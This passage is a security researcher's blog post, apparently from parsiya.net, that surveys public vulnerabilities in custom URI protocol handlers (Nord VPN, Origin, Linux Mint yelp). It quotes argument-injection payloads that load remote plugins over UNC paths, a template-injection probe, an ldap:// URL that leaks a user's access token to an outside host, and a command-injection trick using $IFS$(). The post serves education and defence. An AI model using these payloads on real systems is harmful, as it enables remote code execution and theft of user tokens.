@@ -1,0 +1,988 @@
+<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1">
+<link href=/css/fonts.css rel=stylesheet type=text/css>
+<title>Attack Surface Analysis - Part 2 - Custom Protocol Handlers</title>
+<link rel=stylesheet href=/css/hugo-octopress.css>
+<link rel=stylesheet href=/css/fork-awesome.min.css>
+<link href=https://parsiya.net/favicon.png rel=icon>
+<meta name=description content>
+<meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]">
+<meta name=author content="Parsia">
+<meta name=generator content="Hugo 0.92.0">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image:src content="https://parsiya.net/blog/2021-03-17-attack-surface-analysis-part-2-custom-protocol-handlers/03-gwd-poc.png">
+<meta name=twitter:title content="Attack Surface Analysis - Part 2 - Custom Protocol Handlers">
+<meta name=twitter:description content="Custom protocol handlers are an obscure attack surface. They allow us to convert
+local attacks into remote ones and are an alternative way to
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+jump the browser sandbox without 0days).
+Similar to the first part of this series
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+A Novel Way to Bypass Executable Signature Checks with Electron
+I will analyze this attack surface and discuss a few interesting public bugs. I
+wanted to discuss two of my undisclosed bugs but the post is already too long.
+2021-04-21 updates:
+
+Startup path limitations and possible workarounds.
+Positive security's excellent blog released a month after this with a near
+jar trick.
+Allow arbitrary URLs, expect arbitrary code execution.
+
+The article has a great trick for passing parameters when we cannot. Use jar
+files in UNC paths: \\ip\path\whatever.jar. Search for windows-10-19042 in
+the page.">
+<meta name=twitter:domain content="parsiya.net">
+<meta name=twitter:creator content="@CryptoGangsta">
+</head>
+<body>
+<header role=banner>
+<hgroup>
+<h1><a href=https://parsiya.net/>Hackerman's Hacking Tutorials</a></h1>
+<h2>The knowledge of anything, since all things have causes, is not acquired or
+complete unless it is known by its causes. - Avicenna</h2>
+</hgroup></header>
+<nav role=navigation>
+<fieldset class=mobile-nav>
+<select onchange="location=this.value"><option value>Navigate…</option><option value=https://parsiya.net/about/>» About Me!</option><option value=https://parsiya.net/cheatsheet/>» Cheat Sheet</option><option value=https://parsiya.io/>» My Clone</option><option value=https://github.com/parsiya/parsiya.net>» Source Repo</option><option value="https://queue.acm.org/detail.cfm?id=3197520">» Manual Work is a Bug</option><option value="https://www.google.com/search?q=andrew+ridgeley">» The Other Guy from Wham!</option></select>
+</fieldset>
+<ul class=main-navigation>
+<li><a href=https://parsiya.net/about/ title="About Me!" target=_blank rel="noopener noreferrer">About Me!</a></li>
+<li><a href=https://parsiya.net/cheatsheet/ title="Cheat Sheet" target=_blank rel="noopener noreferrer">Cheat Sheet</a></li>
+<li><a href=https://parsiya.io/ title="My Clone" target=_blank rel="noopener noreferrer">My Clone</a></li>
+<li><a href=https://github.com/parsiya/parsiya.net title="Source Repo" target=_blank rel="noopener noreferrer">Source Repo</a></li>
+<li><a href="https://queue.acm.org/detail.cfm?id=3197520" title="Manual Work is a Bug" target=_blank rel="noopener noreferrer">Manual Work is a Bug</a></li>
+<li><a href="https://www.google.com/search?q=andrew+ridgeley" title="The Other Guy from Wham!" target=_blank rel="noopener noreferrer">The Other Guy from Wham!</a></li>
+</ul>
+<ul class=subscription>
+<a href=https://parsiya.net/index.xml target=_blank type=application/rss+xml title=RSS rel="noopener noreferrer"><i class="fa fa-rss-square fa-lg"></i></a>
+</ul>
+<form action=https://www.google.com/search method=get target=_blank rel="noopener noreferrer">
+<fieldset role=search>
+<input class=search type=text name=q results=0 placeholder=Search>
+<input type=hidden name=q value=site:https://parsiya.net/>
+</fieldset>
+</form>
+</nav>
+<div id=main>
+<div id=content>
+<div>
+<article class=hentry role=article>
+<header>
+<p class=meta>Mar 17, 2021
+- 22 minute read
+- <a href=https://parsiya.net/blog/2021-03-17-attack-surface-analysis-part-2-custom-protocol-handlers/#disqus_thread>Comments</a>
+- <a class=label href=https://parsiya.net/categories/attack-surface-analysis/>Attack Surface Analysis </a>
+</p>
+<h1 class=entry-title>
+Attack Surface Analysis - Part 2 - Custom Protocol Handlers
+</h1>
+</header>
+<div class=entry-content>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#introduction>Introduction</a>
+<ul>
+<li><a href=#privilege-escalation-via-protocol-handlers>Privilege Escalation via Protocol Handlers</a></li>
+</ul>
+</li>
+<li><a href=#unsanitized-input>Unsanitized Input</a>
+<ul>
+<li><a href=#possible-rce-through-windows-custom-protocol-on-nord-vpn-windows-client-by-cyku>Possible RCE through Windows Custom Protocol on [Nord VPN] Windows Client by @Cyku</a>
+<ul>
+<li><a href=#find-bugs-like-this-with-dnspy>Find Bugs Like This with dnSpy</a></li>
+</ul>
+</li>
+<li><a href=#origin-remote-code-execution-by-zer0pwn>Origin Remote Code Execution by @zer0pwn</a></li>
+<li><a href=#linux-mint-183-191-yelp-command-injection-by-b1ack0wl>Linux Mint 18.3-19.1 'yelp' Command Injection by @b1ack0wl</a>
+<ul>
+<li><a href=#browsers-escaping-characters>Browsers Escaping Characters</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href=#loading-remote-files>Loading Remote Files</a>
+<ul>
+<li><a href=#unc-paths>UNC Paths</a></li>
+<li><a href=#cve-2019-6453---rce-on-mirc-using-argument-injection-through-custom-uri-protocol-handlers-by-proofofcalc>CVE-2019-6453 - RCE on mIRC Using Argument Injection Through Custom URI Protocol Handlers by @ProofOfCalc</a>
+<ul>
+<li><a href=#the--->The <code>--</code></a></li>
+</ul>
+</li>
+<li><a href=#cve-2020-13699---unquoted-uri-handler-in-teamviewer-by-jeffssh>CVE-2020-13699 - Unquoted URI handler in TeamViewer by @Jeffssh</a></li>
+</ul>
+</li>
+<li><a href=#command-line-switch-injection>Command-Line Switch Injection</a>
+<ul>
+<li><a href=#electron-and-cef-command-line-injections-by-rgod>Electron and CEF command-line Injections by rgod</a>
+<ul>
+<li><a href=#microsoft-teams-command-injection>Microsoft Teams Command Injection</a></li>
+<li><a href=#google-web-designer-command-injection-via-the-log-file>Google Web Designer Command Injection via The Log File</a>
+<ul>
+<li><a href=#the-type-switch>The type Switch</a></li>
+<li><a href=#the-payload>The Payload</a></li>
+<li><a href=#the-log-file>The Log File</a></li>
+<li><a href=#how-does-this-work>How Does This Work?</a></li>
+<li><a href=#startup-path-limitations-and-possible-workarounds>Startup Path Limitations And Possible Workarounds</a>
+<ul>
+<li><a href=#environment-variables>Environment Variables</a></li>
+<li><a href=#multi-stage-payloads>Multi-stage Payloads</a></li>
+<li><a href=#startup-in-programdata>Startup in ProgramData</a></li>
+<li><a href=#guessing-the-username>Guessing The Username</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href=#skype-command-injection-via-browser-subprocess-command>Skype Command Injection via browser-subprocess-command</a></li>
+<li><a href=#slack-command-line-injection-via-browser-subprocess-command>Slack command-line Injection via browser-subprocess-command</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href=#so-how-do-i-get-started>So, How Do I Get Started?</a>
+<ul>
+<li><a href=#listing-all-registered-protocol-handlers>Listing All Registered Protocol Handlers</a></li>
+<li><a href=#command-line-switches>Command-Line Switches</a></li>
+<li><a href=#how-parameters-are-processed>How Parameters are Processed</a></li>
+<li><a href=#flow-analysis>Flow Analysis</a></li>
+<li><a href=#passing-remote-files>Passing Remote Files</a></li>
+</ul>
+</li>
+<li><a href=#what-did-we-learn-here-today>What Did We Learn Here Today?</a>
+<ul>
+<li><a href=#do-you-wanna-know-more>Do You Wanna Know More?</a></li>
+</ul>
+</li>
+<li><a href=#acknowledgements>Acknowledgements</a></li>
+</ul>
+</nav>
+<p>Custom protocol handlers are an obscure attack surface. They allow us to convert
+local attacks into remote ones and are an alternative way to
+<a href=/blog/2020-08-13-localghost-escaping-the-browser-sandbox-without-0-days/ title="jump the browser sandbox without 0days" rel=nofollow target=_blank>jump the browser sandbox without 0days</a>).</p>
+<p>Similar to the first part of this series
+<a href=/blog/2021-01-08-attack-surface-analysis-part-1-application-update-a-novel-way-to-bypass-executable-signature-checks-with-electron/ title="A Novel Way to Bypass Executable Signature Checks with Electron" rel=nofollow target=_blank>A Novel Way to Bypass Executable Signature Checks with Electron</a>
+I will analyze this attack surface and discuss a few interesting public bugs. I
+wanted to discuss two of my undisclosed bugs but the post is already too long.</p>
+<p><strong>2021-04-21 updates</strong>:</p>
+<ol>
+<li>Startup path limitations and possible workarounds.</li>
+<li>Positive security's excellent blog released a month after this with a near
+jar trick.</li>
+<li><a href=https://positive.security/blog/url-open-rce target=_blank rel="noreferrer noopener">Allow arbitrary URLs, expect arbitrary code execution</a>.</li>
+</ol>
+<p>The article has a great trick for passing parameters when we cannot. Use <code>jar</code>
+files in UNC paths: <code>\\ip\path\whatever.jar</code>. Search for <code>windows-10-19042</code> in
+the page.</p>
+<p><strong>TL;DR:</strong> Custom protocol handlers are a great attack surface and allow us to
+exploit local vulnerabilities from the browser. If the target app registers a
+handler, analyze how the arguments are processed and if they can be used to
+launch an attack. As a developer, do not trust any input that comes from URIs.</p>
+<h1 id=introduction>Introduction
+<a class=header-link href=#introduction><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>You can register a scheme (e.g., <code>bleh</code>) and then run your app from the browser
+(or locally). If the user clicks on <code>bleh://whatever</code> the browser asks if they
+want to run your app (Firefox allows saving this selection). If the app is set
+up to handle the URI like <code>"C:/whatever/app.exe" "%1"</code> (the most common way),
+the OS will execute <code>app.exe "bleh://whatever"</code>. The browser also does some
+parameter encoding but that is out of scope for this post.</p>
+<p>For a great introduction please read
+<a href=https://textslashplain.com/2019/08/29/web-to-app-communication-app-protocols/ target=_blank rel="noreferrer noopener">Web-to-App Communication: App Protocols</a> by
+<a href=https://twitter.com/ericlaw target=_blank rel="noreferrer noopener">Eric Lawrence</a>.</p>
+<p>Protocols are registered by adding a registry key under <code>HKEY_CLASSES_ROOT</code>.
+Open regedit and go to
+<code>Computer\HKEY_CLASSES_ROOT\WMP11.AssocProtocol.MMS\shell\open\command</code> to see
+a scheme for the Windows Media Player app:</p>
+<span class=caption-wrapper>
+<img class=caption src=01-wmplayer-run.png title="WMP11.AssocProtocol.MMS handler" alt="WMP11.AssocProtocol.MMS handler">
+<span class=caption-text>WMP11.AssocProtocol.MMS handler</span>
+</span>
+<ol>
+<li>Type <code>wmp11.assocprotocol.mms:https://example.net</code> in any browser's address
+bar and press enter.
+<ol>
+<li>Alternative 1: Run <code>wmp11.assocprotocol.mms:https://example.net</code> in the
+Run prompt (<code>Win+R</code>).</li>
+<li>Alternative 2: Run <code>start wmp11.assocprotocol.mms:https://example.net</code> in cmd.</li>
+</ol>
+</li>
+<li>In the browser you will get a prompt that asks if you want to open the
+Windows Media Player.</li>
+<li>If you accept the prompt, Media Player will start and complain about the URL.</li>
+</ol>
+<p>In <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/procmon target=_blank rel="noreferrer noopener">procmon</a> we can see what was passed to the app.</p>
+<span class=caption-wrapper>
+<img class=caption src=02-wmplayer-procmon.png title="WMPlayer command-line in procmon" alt="WMPlayer command-line in procmon">
+<span class=caption-text>WMPlayer command-line in procmon</span>
+</span>
+<p>To see all registered handlers use <a href=https://www.nirsoft.net/utils/url_protocol_view.html target=_blank rel="noreferrer noopener">URLProtocolView</a> by
+Nirsoft.</p>
+<h2 id=privilege-escalation-via-protocol-handlers>Privilege Escalation via Protocol Handlers
+<a class=header-link href=#privilege-escalation-via-protocol-handlers><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Remember our three privilege levels from part 1?</p>
+<ol>
+<li>Remote attacker</li>
+<li>Local attacker running as a standard user</li>
+<li>Local admin/SYSTEM</li>
+</ol>
+<p>Remote attackers can reach URI handlers. If you can get users to click a link in
+the browser then you can execute a local app with your controlled parameters
+(terms and conditions apply). You can escalate your privilege from a remote
+attacker to a local one.</p>
+<p>So far, we have established that it's a usually ignored but rich attack surface
+that we should pay attention to. In the rest of the post, I am going to try
+and classify different vulnerabilities in this space and discuss some public
+bugs. I have linked to every writeup at the beginning of each section so make
+sure to read the actual bug, too.</p>
+<h1 id=unsanitized-input>Unsanitized Input
+<a class=header-link href=#unsanitized-input><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>Apps usually trust their command-line switches. After all, why should I care if
+a user can spawn a new process as themselves through my app? We can take
+advantage of this trust.</p>
+<p>To discover these types of vulnerabilities, we need to observe what command-line
+switches are available, how they are processed, and finally, check if the
+app's behavior can be altered by our supplied arguments.</p>
+<p>You will see some overlap between this section and the next. The exploits here
+just inject values into the command-line but the next also pass remote files.</p>
+<h2 id=possible-rce-through-windows-custom-protocol-on-nord-vpn-windows-client-by-cyku>Possible RCE through Windows Custom Protocol on [Nord VPN] Windows Client by @Cyku
+<a class=header-link href=#possible-rce-through-windows-custom-protocol-on-nord-vpn-windows-client-by-cyku><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>This is a disclosed HackerOne report by <a href=https://twitter.com/cyku_tw target=_blank rel="noreferrer noopener">Cyku</a>. The report is at
+<a href=https://hackerone.com/reports/1001255 target=_blank rel="noreferrer noopener">https://hackerone.com/reports/1001255</a>.</p>
+<p>They used the URI protocol handler to pass a serialized notification string to
+the Nord VPN Windows client. The app would deserialize the input and use the
+value of the <code>OpenUrl</code> parameter to spawn a new process. An attacker can get
+code execution on your machine if they can get you to click a link on a webpage.</p>
+<p>Looking at the call stack in the report, the input is passed to
+<a href="https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start?view=net-5.0#System_Diagnostics_Process_Start_System_String_" target=_blank rel="noreferrer noopener">Process.Start(String)</a>. This is an overload of
+<code>Process.Start</code> that just executes the file passed to it. An unfortunate
+limitation of this overload is not being able to pass parameters.</p>
+<p><strong>Update 2021-04-29:</strong> It seems like we can pass remote <code>jar</code> files as a UNC
+path to get around this limitation. See section
+<a href=https://positive.security/blog/url-open-rce#windows-10-19042 target=_blank rel="noreferrer noopener">Windows 10 19042</a> in Positive Security's article linked
+above.</p>
+<h3 id=find-bugs-like-this-with-dnspy>Find Bugs Like This with dnSpy
+<a class=header-link href=#find-bugs-like-this-with-dnspy><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h3><p>The previous bug was not easy to find and I probably would not have found it.
+dnSpy can help you, but you still need to do the flow analysis and read
+decompiled source code.</p>
+<p>If you have a .NET app, try this workflow:</p>
+<ol>
+<li>Drag and drop everything in the installation directory into dnSpy.</li>
+<li>Search for <code>Process.Start</code> in <code>Edit (menu) > Search Assembly</code>.</li>
+<li>Right-click every overload in the code and select <code>Analyze</code>.
+<ol>
+<li><code>Process.Start</code> has multiple overloads.</li>
+</ol>
+</li>
+<li>Go down the usage chain by repeatedly opening <code>Used By</code>.</li>
+<li>Continue until you get to a location where input is user-controlled.</li>
+<li>???</li>
+<li>RCE</li>
+</ol>
+<p>You can also put a breakpoint on <code>Process.Start</code> and then run the app. When the
+breakpoint is triggered look at the input and also use the <code>call stack</code> feature
+to see how you have landed at the breakpoint.</p>
+<h2 id=origin-remote-code-execution-by-zer0pwn>Origin Remote Code Execution by @zer0pwn
+<a class=header-link href=#origin-remote-code-execution-by-zer0pwn><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Disclosure: I work for <a href=https://ea.com/security target=_blank rel="noreferrer noopener">EA security</a> and Origin is one of our
+products. <a href=https://twitter.com/zer0pwn target=_blank rel="noreferrer noopener">Dominik Penner/zer0pwn</a> has a couple of Origin bugs
+that I am going to discuss.</p>
+<p>The first one is <a href=https://zero.lol/posts/2019-05-22-fun-with-uri-handlers/ target=_blank rel="noreferrer noopener">Fun With Custom URI Schemes</a> and while not
+exploitable directly from the browser, it deals with how Qt (pronounced cute)
+command-line switches can result in remote code execution. It's a good start if
+you want to start doing security research on Qt apps.</p>
+<p>You can pass a command-line switch to Qt apps to designate the path to
+plugins. Qt plugins (at least on Windows) are DLLs that can spawn new processes.
+If you want to know more about Qt issues like this please read
+<a href=https://www.thezdi.com/blog/2019/4/3/loading-up-a-pair-of-qt-bugs-detailing-cve-2019-1636-and-cve-2019-6739 target=_blank rel="noreferrer noopener">Loading up a Pair of Qt Bugs: Detailing CVE-2019-1636 and CVE-2019-6739</a></p>
+<p>The blog experiments with passing a UNC path to a remote path to this switch:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#268bd2>iframe</span> src<span style=color:#719e07>=</span><span style=color:#2aa198>&#39;origin://?&#34;
+</span><span style=color:#2aa198>    -platformpluginpath \\path\to\remote\plugindir\ &#34;
+</span><span style=color:#2aa198>&#39;</span>&gt;
+</code></pre></div><p>Unfortunately (well fortunately for us at EA), the browser encoding saves us.
+The payload becomes
+<code>Origin.exe "origin:///?%22-platformpluginpath \\path\to\remote\plugindir\ %22"</code>
+which doesn't work.</p>
+<p>The workaround is a <code>.URL</code> file. Think of it as a shortcut file. You can
+put custom URIs in it and they do not get encoded. So, a URL file like this
+works.</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=color:#719e07>[InternetShortcut]</span>
+URL<span style=color:#719e07>=</span><span style=color:#2aa198>origin://?&#34; -platformpluginpath \\path\to\remote\plugindir\ &#34;</span>
+</code></pre></div><p>However, you need to social engineer the users to not only click on the link to
+download your file but to also run it. If you can get people to run a file they
+have downloaded you do not need Origin although, having a shortcut with the
+Origin icon helps. It's a great bug and I am not trying to downplay it.</p>
+<p>We were not so lucky with the second bug
+<a href=https://zero.lol/posts/2019-05-13-xss-to-rce/ target=_blank rel="noreferrer noopener">A Questionable Journey From XSS to RCE</a>. Origin frontend uses
+Angular and it was vulnerable to a well-known sandbox escape.</p>
+<p>You could pass a URI scheme and inject values into <code>title</code>.
+<code>origin://game/launch/?offerIds=0&title={{7*7}}</code>. This is the typical Angular
+template injection testing payload and should inject <code>49</code> there.</p>
+<p>A sandbox bypass was discovered and used. There are a ton of these going around.
+For a great intro please see
+<a href=https://www.slideshare.net/LewisArdern/so-you-thought-you-were-safe-using-angularjs-think-again target=_blank rel="noreferrer noopener">So you thought you were safe using AngularJS.. Think again!</a>
+by my good friend and solid 5/7 JavaScript guy, <a href=https://twitter.com/LewisArdern target=_blank rel="noreferrer noopener">Lewis Ardern</a>.</p>
+<p>Now, we have client-side template injection and can inject JavaScript. This is
+not Electron where you can just run <code>require('child_process').exec('calc')</code> and
+get RCE on <a href=https://hackerone.com/reports/873614 target=_blank rel="noreferrer noopener">PlayStation Now</a> (shameless brag).</p>
+<p>Origin had a "JavaScript bridge" (if I may) that allowed JavaScript to call
+<code>QDesktopServices</code>. A function named <code>asyncOpenUrl()</code> calls <code>openUrl()</code> which
+allows us to open URLs and also schemes.Using that limited RCE was possible.</p>
+<p>For example, you could pop calc with
+<code>Origin.client.desktopServices.asyncOpenUrl("calc.exe")</code>. Unfortunately, this is
+a limitation of these functions. You cannot pass parameters to them. The same
+limitation was in the Nord VPN bug with the <code>Process.Start(string)</code> overload. I
+have spent quite some time trying to break out to no avail (future blog post?).</p>
+<p><strong>Update 2021-04-29:</strong> It seems like we can pass remote <code>jar</code> files as a UNC
+path to get around this limitation. See section
+<a href=https://positive.security/blog/url-open-rce#windows-10-19042 target=_blank rel="noreferrer noopener">Windows 10 19042</a> in Positive Security's article linked
+above.</p>
+<p>However, the payload is running in a JavaScript context and you have access to
+things like user tokens. The authors found a clever way of exfiltrating user
+information such as access tokens using the <code>ldap</code> scheme like
+<code>"ldap://safe.tld/o="+Origin.user.accessToken()+",c=UnderDog"</code>.</p>
+<p>As the <a href=https://en.wikipedia.org/wiki/Ninth_Doctor target=_blank rel="noreferrer noopener">Ninth Doctor</a> (best doctor) would have said, fantastic!</p>
+<h2 id=linux-mint-183-191-yelp-command-injection-by-b1ack0wl>Linux Mint 18.3-19.1 'yelp' Command Injection by @b1ack0wl
+<a class=header-link href=#linux-mint-183-191-yelp-command-injection-by-b1ack0wl><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p><a href=https://twitter.com/b1ack0wl target=_blank rel="noreferrer noopener">@b1ack0wl</a> pointed me to this bug in the URI handler for
+Yelp. I realized I have only talked about Windows and it might imply that URI
+bugs only happen on Windows. Here, we can see that it's possible to have a
+similar bug on Linux.</p>
+<p><a href=https://github.com/b1ack0wl/linux_mint_poc target=_blank rel="noreferrer noopener">The URI handler for yelp</a> is run like <code>Exec=yelp %u</code>. Think of
+it as <code>app.exe %1</code> without quotes. In this case, the URI is passed (note the
+lack of quotes) directly to the following Python file:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#586e75>#!/usr/bin/python</span>
+
+<span style=color:#719e07>import</span> os
+<span style=color:#719e07>import</span> sys
+
+<span style=color:#719e07>if</span> (<span style=color:#b58900>len</span>(sys<span style=color:#719e07>.</span>argv) <span style=color:#719e07>&gt;</span> <span style=color:#2aa198>1</span>):
+    args <span style=color:#719e07>=</span> <span style=color:#2aa198>&#39; &#39;</span><span style=color:#719e07>.</span>join(sys<span style=color:#719e07>.</span>argv[<span style=color:#2aa198>1</span>:])
+    <span style=color:#719e07>if</span> (<span style=color:#2aa198>&#39;gnome-help&#39;</span> <span style=color:#719e07>in</span> args) <span style=color:#719e07>and</span> <span style=color:#719e07>not</span> os<span style=color:#719e07>.</span>path<span style=color:#719e07>.</span>exists(<span style=color:#2aa198>&#39;/usr/share/help/C/gnome-help&#39;</span>):
+        os<span style=color:#719e07>.</span>system (<span style=color:#2aa198>&#34;xdg-open http://www.linuxmint.com/documentation.php &amp;&#34;</span>)
+    <span style=color:#719e07>elif</span> (<span style=color:#2aa198>&#39;ubuntu-help&#39;</span> <span style=color:#719e07>in</span> args) <span style=color:#719e07>and</span> <span style=color:#719e07>not</span> os<span style=color:#719e07>.</span>path<span style=color:#719e07>.</span>exists(<span style=color:#2aa198>&#39;/usr/share/help/C/ubuntu-help&#39;</span>):
+        os<span style=color:#719e07>.</span>system (<span style=color:#2aa198>&#34;xdg-open http://www.linuxmint.com/documentation.php &amp;&#34;</span>)
+    <span style=color:#719e07>else</span>:
+        os<span style=color:#719e07>.</span>system (<span style=color:#2aa198>&#34;/usr/bin/yelp </span><span style=color:#2aa198>%s</span><span style=color:#2aa198>&#34;</span> <span style=color:#719e07>%</span> args)  <span style=color:#586e75># uh oh</span>
+<span style=color:#719e07>else</span>:
+    os<span style=color:#719e07>.</span>system (<span style=color:#2aa198>&#39;/usr/bin/yelp&#39;</span>)
+</code></pre></div><p>If the URI string does not contain <code>gnome-help</code> and <code>ubuntu-help</code>, it's passed
+to a vulnerable <code>os.System</code> invocation.</p>
+<h3 id=browsers-escaping-characters>Browsers Escaping Characters
+<a class=header-link href=#browsers-escaping-characters><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h3><p>Now, browser escaping comes into play. It is something we have not had to deal
+with in our reviewed bugs, yet. Browsers encode/escape specific characters
+before passing them on.
+<a href=https://www.vdoo.com/blog/exploiting-custom-protocol-handlers-in-windows target=_blank rel="noreferrer noopener">Exploiting Custom Protocol Handlers in Windows</a> in the
+references section has a section about encoding/bypassing and you can find a few
+more on the web.</p>
+<p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=785809" target=_blank rel="noreferrer noopener">Chromium bug 785809</a> has some good discussions about what to
+encode and how to do it (<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=785809#c22" target=_blank rel="noreferrer noopener">comment #22</a> is the most important
+IMO). It also touches on how Windows handles URI paths
+(<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=785809#c22" target=_blank rel="noreferrer noopener">comment #21</a>).</p>
+<p>Chrome encodes space to <code>%20</code>. So, they replaced it with <code>$IFS$()</code>. The default
+value of it is <code>space, tab, newline</code>. <a href=https://bash.cyberciti.biz/guide/$IFS target=_blank rel="noreferrer noopener">Internal Field Separator or IFS</a>
+tells bash how to separate words.</p>
+<p>You can also smuggle <code>@</code> into the URI strings because the parsers are looking
+for <code>protocol://user:pass@server.tld/</code>. <a href=https://twitter.com/jonasLyk/status/1372952003719143428 target=_blank rel="noreferrer noopener">Tweet</a> by
+<a href=https://twitter.com/jonasLyk target=_blank rel="noreferrer noopener">@jonasLyk</a></p>
+<h1 id=loading-remote-files>Loading Remote Files
+<a class=header-link href=#loading-remote-files><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
